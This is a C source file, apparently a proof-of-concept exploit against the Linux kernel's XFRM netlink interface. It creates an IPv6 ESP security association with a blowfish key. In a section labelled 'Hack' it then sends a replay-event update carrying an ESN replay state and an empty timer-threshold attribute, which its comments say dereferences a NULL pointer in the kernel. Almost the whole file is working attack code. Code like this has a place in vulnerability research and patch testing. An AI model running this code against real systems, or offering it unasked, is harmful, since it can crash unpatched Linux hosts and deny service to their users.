#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/genetlink.h>
#include <linux/in6.h>
#include <linux/types.h>
#include <linux/ipsec.h>
#include <linux/xfrm.h>
#include <linux/udp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include <errno.h>

#include "netlink.h"

int main(int argc, char const *argv[])
{
    ////////////////////////////////////////////////////
    // Preprartion
    ////////////////////////////////////////////////////

    // 1. prepare xfrm socket
    int nlsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (nlsock < 0)
    {
        perror("[!] netlink socket()");
        exit(1);
    }

    // 2. prepare XFRM_STATE_VALID state via xfrm_add_sa

    struct nlmsg nlmsg;
    struct xfrm_usersa_info sa_info = {0};

    sa_info.family = AF_INET6;
    sa_info.sel.family = AF_UNSPEC;
    sa_info.id.proto = IPPROTO_ESP; /* AH not support encap */
    inet_pton(AF_INET6, "::2", &sa_info.id.daddr.in6);
    inet_pton(AF_INET6, "::3", &sa_info.saddr.in6);
    sa_info.id.spi = 0x1;
    sa_info.mode = XFRM_MODE_TRANSPORT;

    netlink_init(&nlmsg, XFRM_MSG_NEWSA, 0 /* what flag should be okay */, 
                 &sa_info, sizeof(sa_info));

    // prepare valid auth algorithm
    const uint8_t keylen = 48;
    struct xfrm_algo *algo= malloc(sizeof(struct xfrm_algo) + keylen /* added key length*/);

    memset(algo, 0, sizeof(struct xfrm_algo) + keylen);
    strcpy(algo->alg_name, "cbc(blowfish)");

    algo->alg_key_len = keylen * 8; // unsigned int
    netlink_attr(&nlmsg, XFRMA_ALG_CRYPT, algo, sizeof(struct xfrm_algo) + keylen);

    if (netlink_send(&nlmsg, nlsock) < 0) {
        perror("[!] netlink send 1");
        exit(-1);
    }

    free(algo);

    ////////////////////////////////////////////////////
    // Hack
    ////////////////////////////////////////////////////

    // xfrm_replay_state_esn allow direct NPD

    struct xfrm_aevent_id event = {0};
    // need to make sure xfrm_state_lookup get our state
    inet_pton(AF_INET6, "::2", &event.sa_id.daddr.in6);
    inet_pton(AF_INET6, "::3", &event.saddr.in6);
    event.sa_id.proto = IPPROTO_ESP;
    event.sa_id.spi = 0x1;
    event.sa_id.family = AF_INET6;

    netlink_init(&nlmsg, XFRM_MSG_NEWAE, NLM_F_REPLACE, &event, sizeof(event));

    uint32_t bmp_len = 0x20;

    struct xfrm_replay_state_esn* esn = malloc(sizeof(struct xfrm_replay_state_esn) + bmp_len);
    netlink_attr(&nlmsg, XFRMA_REPLAY_ESN_VAL, esn, sizeof(struct xfrm_replay_state_esn) + bmp_len);
    
    netlink_attr(&nlmsg, XFRMA_MTIMER_THRESH, NULL, 0);

    if (netlink_send(&nlmsg, nlsock) < 0) { // NULL-POINTER-DEREF here
        perror("[!] netlink send 2");
        exit(-1);
    }

    return 0;
}
